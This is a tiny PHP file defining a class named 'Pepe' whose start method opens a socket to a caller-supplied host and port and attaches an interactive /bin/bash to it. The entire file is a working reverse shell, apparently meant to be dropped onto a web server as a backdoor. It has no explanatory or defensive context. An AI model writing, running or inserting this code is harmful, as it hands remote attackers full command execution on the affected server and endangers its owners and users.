<?php
class Pepe
{
  public function start($a, $b) {
	$polie=fsockopen($a,$b);
	$dol=proc_open("/bin/bash -i", array(0=>$polie, 1=>$polie, 2=>$polie),$pipes);
}
}
?>
